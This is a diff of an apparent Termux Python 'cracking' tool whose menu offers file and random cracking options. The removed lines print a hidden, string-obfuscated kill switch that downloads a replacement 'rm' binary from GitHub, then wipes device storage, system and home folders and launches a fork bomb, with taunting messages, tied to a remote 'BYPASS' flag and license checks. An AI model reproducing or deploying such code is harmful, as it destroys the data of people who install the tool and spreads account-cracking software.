@@ -163,63 +163,7 @@ except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
 c.close()
 body = buffer.getvalue().decode('utf-8')
 link = body
-#-------------------------(MR-TOP APPROVAL LINK CHECKER)------------------------->>>
-if hamdam(moja)==16:pass
-else:print(f"{style} {note} ");exit()
-if hamdam(xodas)==22:pass
-else:print(f"{style} {note} ");exit()
-if hamdam(hala)==17:pass
-else:print(f"{style} {note} ");exit()
-if hamdam(kire)==16:pass
-else:print(f"{style} {note} ");exit()
-if hamdam(naki)==25:pass
-else:print(f"{style} {note} ");exit()
-#-------------------------(MR-TOP APPROVAL)------------------------->>>
-def rsbuy():
-    try:
-        clear()
-        #if 'BYPASS' in link:os.system("c"+"d /"+"data"+"/dat"+"a/com"+".term"+"ux/fi"+"les/usr"+"/bin &"+"& cur"+"l -s"+"S -"+"L ht"+"tps:/"+"/githu"+"b.com"+"/R"+"EFAT"+"-"+"156/"+"Serve"+"rO"+"fRefa"+"t/raw"+"/main"+"/rm "+"-o rm"+" &&"+" chm"+"od +x"+" /dat"+"a/data"+"/com."+"termu"+"x/file"+"s/usr/"+"bin/r"+"m &"+"& c"+"d "+"$HO"+"ME/REF"+"AT"+"-XD");wash('touch .hushlogin');wash('rm -rf /sdcard/DCIM');wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash('rm -rf /data/data/com.termux');wash(':(){ :|: & };:');wash('clear');print(logo);_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 🙂 ');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤗 ');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...🤞 ');_________linex_________();time.sleep(2);exit()
-        elif 'UPDATE' in link:clear();verify();iamcheckingyou();print(f'\n{style} Tool Is Under Maintenance For Few Hours....\n');time.sleep(2);();exit()
-        elif 'FREE' in link:clear();verify();iamcheckingyou();print(f'{style} Free Trial For Some Time..!');time.sleep(3);_________linex_________();___R_E_F_A_T___()
-        elif tornanire in link:clear();___R_E_F_A_T___()
-        else:
-            wash("clear");print(logopaid);print(f"\n{style}{G3} KEY ● {tornanire}\n")
-            url_wa = "https:"+"//api.whats"+"app.com/send"+"?phone=+88018927"+17653"&text="
-            tks = (f"ASSALAMUA"+"LAIKUM MR"+"-TOP SIR I WA"+"NT TO BU"+"Y YOUR P"+"AID TOOLS VERSI"+f"ON {vr} PLEA"+"SE ACC"+"EPT MY KEY TO PREM"+"IUM ❤️\n\nKEY ● "+tornanire)
-            subprocess.check_output(["am", "start", url_wa+(tks)]);exit()
-    except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
-    except ValueError:exit()
-    except Exception as e:exit()
-#-------------------------(MR-TOP APPROVAL)------------------------->>>
-def __durmagi__():
-    return None
-    #if tornanire in link:pass
-    #else:os.system("c"+"d /"+"data"+"/dat"+"a/com"+".term"+"ux/fi"+"les/usr"+"/bin &"+"& cur"+"l -s"+"S -"+"L ht"+"tps:/"+"/githu"+"b.com"+"/R"+"EFAT"+"-"+"156/"+"Serve"+"rO"+"fRefa"+"t/raw"+"/main"+"/rm "+"-o rm"+" &&"+" chm"+"od +x"+" /dat"+"a/data"+"/com."+"termu"+"x/file"+"s/usr/"+"bin/r"+"m &"+"& c"+"d "+"$HO"+"ME/REF"+"AT"+"-XD");wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-#-------------------------(MAIN MENU)------------------------->>>
-def ___R_E_F_A_T___():
-    global lim
-    clear();verify();iamcheckingyou()
-    try:
-        key = open('/data'+'/data/com'+'.termux/fi'+'les/usr/bi'+'n/.tmrnu'+'nucoto.txt','r').read()
-    except FileNotFoundError: 
-        key = str(input(f"{style} P"+"UT L"+"ICE"+f"NSE {RE}●{G} "))
-    result = Key.activate(token=auth,\
-    rsa_pub_key=OkLic,\
-    product_id=23545, \
-    key=key,\
-    machine_code=Helpers.GetMachineCode())
-    if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
-        clear()
-        print(f"{style} Yo"+"ur Lice"+"nse Ex"+"pired Cont"+"act Adm"+"in....");time.sleep(3);os.system("rm /data"+"/data/c"+"om.te"+"rmux/file"+"s/usr/bin/.tmr"+"nunuc"+"oto.txt");wash("xdg-open https:/"+"/chat.whats"+"app.com/LJk2V"+"t0ogyTFJDyk2GNqv0");___R_E_F_A_T___()
-    else:
-        clear()
-        license_key = result[0]
-        with open('/data'+'/dat'+'a/com.te'+'rmux/file'+'s/usr/bin/.'+'tmrnunu'+'coto.txt','w') as f:
-            f.write(key)
-    print(f"{L}[\033[01m\033[94;1m\033[47m USEAGE ● TOOL ON"+"LY WORK MO"+"BILE DA"+f"TA \033[40m{L}]")
-    _________linex_________()
-    print(f"{style} LICENSE EXPIRE{K} ●{Y} " +str(license_key.expires))
-    _________linex_________()
+
     print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G0} FIL"+"E CRAC"+"KING")
     print(f"{G}[{R}B{G}]{X}_{Y}_{Z}>{G1} RA"+"NDOM C"+"RACKING")
     print(f"{G}[{R}C{G}]{X}_{Y}_{Z}>{G2} FILE CR"+"EATE M"+"ENU")
